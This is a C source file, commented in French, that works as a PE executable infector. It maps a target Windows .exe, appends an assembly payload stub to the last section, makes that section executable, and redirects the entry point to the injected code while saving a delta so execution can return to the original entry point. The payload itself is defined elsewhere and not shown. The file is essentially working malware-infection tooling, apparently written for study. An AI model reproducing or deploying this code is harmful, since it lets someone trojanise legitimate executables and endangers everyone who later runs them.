/*
 * Programme d'injection d'un exécutable PE (Portable Executable)
 * Ce programme lit un fichier PE, accède aux sections, et modifie la dernière section pour la rendre exécutable.
 * Il utilise un "STUB" en assembleur dont l'objectif est de rendre le code indépendant.
 * Le programme modifie une variable delta, qui représente l'offset entre le point d'entrée actuel et l'ancien.
 * Cela permet de calculer un saut vers l'ancien code en utilisant rbp.
 * L'objectif principal est de modifier un exécutable existant en y injectant du code personnalisé.
 */

#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "user32.lib")

 // Fonction pour copier de la mémoire
void my_memcpy(PUCHAR dst, PUCHAR src, DWORD len)
{
    for (DWORD i = 0; i < len; i += 1)
        dst[i] = src[i];
}

int main(int ac, char** av)
{
    // Vérification des arguments
    if (ac != 2)
    {
        printf("Usage: %s EXEFILE\n", av[0]);
        return 2600;
    }

    // Pointeurs externes au code en assembleur à injecter
    extern void payload(); // Point d'entrée du code assembleur
    extern char __begin_of_code; // Début du code assembleur
    extern ULONGLONG __end_of_code; // Fin du code assembleur

    printf("FUN %p\n", payload);
    printf("BEGIN %p\n", (PUCHAR)&__begin_of_code);
    printf("END %p\n", (PUCHAR)&__end_of_code);

    // Calcul du nombre de bytes à ajouter (différence entre la fin et le début du code ASM) + 1 ULONGLONG
    DWORD nb_add = ((PUCHAR)&__end_of_code - (PUCHAR)&__begin_of_code) + sizeof(ULONGLONG);

    // Obtention des droits de lecture/écriture pour modifier la section de code
    DWORD old_protect;
    VirtualProtect(&__end_of_code, sizeof(__end_of_code), PAGE_READWRITE, &old_protect);

    // Mise à jour de la taille du code
    __end_of_code = nb_add;
    printf("ADD %X - %d\n", ((PUCHAR)payload)[0], nb_add);

    // Affichage du payload pour vérification
    printf("DUMP %d\n", nb_add);
    for (int i = 0; i < nb_add; i += 1)
        printf("%X", ((PUCHAR)payload)[i]);
    printf("\n");

    // Ouverture du fichier PE à modifier
    char* thefile = av[1];
    HANDLE hFile = CreateFileA(
        thefile,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

#if DEBUG
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DWORD err = GetLastError();
        printf("Erreur CreateFileA %d\n", err);
        return err;
    }
#endif

    // Calcul de la taille actuelle du fichier et de la nouvelle taille après injection
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    DWORD dwNewFileSize = dwFileSize + nb_add;

    // Mapping du fichier en mémoire pour modification
    HANDLE hMapFile = CreateFileMapping(
        hFile,
        NULL,
        PAGE_READWRITE,
        0,
        dwNewFileSize,
        NULL
    );

#if DEBUG
    if (hMapFile == NULL)
    {
        DWORD err = GetLastError();
        printf("Erreur CreateFileMapping %d\n", err);
        return err;
    }
#endif

    LPVOID lpMapAdr = MapViewOfFile(
        hMapFile,
        FILE_MAP_ALL_ACCESS,
        0,
        0,
        0
    );

#if DEBUG
    if (lpMapAdr == NULL)
    {
        DWORD err = GetLastError();
        printf("Erreur MapViewOfFile %d\n", err);
        return err;
    }
#endif

    // Lecture des en-têtes PE pour accéder aux sections
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpMapAdr;
#if DEBUG
    printf("DOS SIG %c%c\n", ((char*)&pDosHeader->e_magic)[0], ((char*)&pDosHeader->e_magic)[1]);
    printf("DOS next %d\n", pDosHeader->e_lfanew);
#endif
    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)lpMapAdr + pDosHeader->e_lfanew);
    char* sig = (char*)&pNtHeader->Signature;
    printf("NT SIG %s\n", sig);
    printf("NT Machine %#02X\n", pNtHeader->FileHeader.Machine);

    // Affichage des informations de l'en-tête optionnel
    printf("Optional SizeOfCode %#08X\n", pNtHeader->OptionalHeader.SizeOfCode);
    printf("Optional AOEP %#08X\n", pNtHeader->OptionalHeader.AddressOfEntryPoint);
    printf("Optional ImageBase %#016llX\n", pNtHeader->OptionalHeader.ImageBase);

    // Accès à la dernière section du PE
    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((PUCHAR)pNtHeader + sizeof(IMAGE_NT_HEADERS64));
    WORD idxSection = pNtHeader->FileHeader.NumberOfSections - 1;

    printf("Section Name: %s\n", pSection[idxSection].Name);
    printf("Virtual Adr: %#08X\n", pSection[idxSection].VirtualAddress);
    printf("Virtual Size: %d\n", pSection[idxSection].Misc.VirtualSize);
    printf("PointerRawData Adr: %#08X\n", pSection[idxSection].PointerToRawData);
    printf("Size Of Raw Data: %d\n", pSection[idxSection].SizeOfRawData);
    int is_exec = (pSection[idxSection].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;

    // Pointeur à la fin de la dernière section (.reloc)
    PUCHAR dstPtr = (PUCHAR)lpMapAdr + pSection[idxSection].PointerToRawData + pSection[idxSection].SizeOfRawData;

    // Sauvegarde de l'ancienne adresse d'entrée
    DWORD oldADE = pNtHeader->OptionalHeader.AddressOfEntryPoint;
    // Modification de l'adresse d'entrée pour pointer sur le nouveau code
    pNtHeader->OptionalHeader.AddressOfEntryPoint = pSection[idxSection].VirtualAddress + pSection[idxSection].SizeOfRawData;

    // Calcul de la différence entre le nouveau et l'ancien point d'entrée
    extern LONGLONG delta;
    delta = (LONGLONG)oldADE - (LONGLONG)pNtHeader->OptionalHeader.AddressOfEntryPoint;

    // Calcul de l'offset vers le code C injecté
    extern LONGLONG to_c_code;
    extern void inj_code_c();
    to_c_code = (PUCHAR)inj_code_c - &__begin_of_code;

    // Injection du code assembleur à la fin de la dernière section
    my_memcpy(dstPtr, (PUCHAR)payload, nb_add);

    // Mise à jour des tailles dans les en-têtes pour éviter la corruption du PE
    pSection[idxSection].Misc.VirtualSize += nb_add;
    pSection[idxSection].SizeOfRawData += nb_add;
    // Passage de la section en exécutable
    pSection[idxSection].Characteristics |= IMAGE_SCN_MEM_EXECUTE;
    printf("is exec %d\n", is_exec);

    // Nettoyage et sortie
    FlushViewOfFile(lpMapAdr, dwNewFileSize);
    UnmapViewOfFile(lpMapAdr);
    CloseHandle(hFile);

    return 0;
}
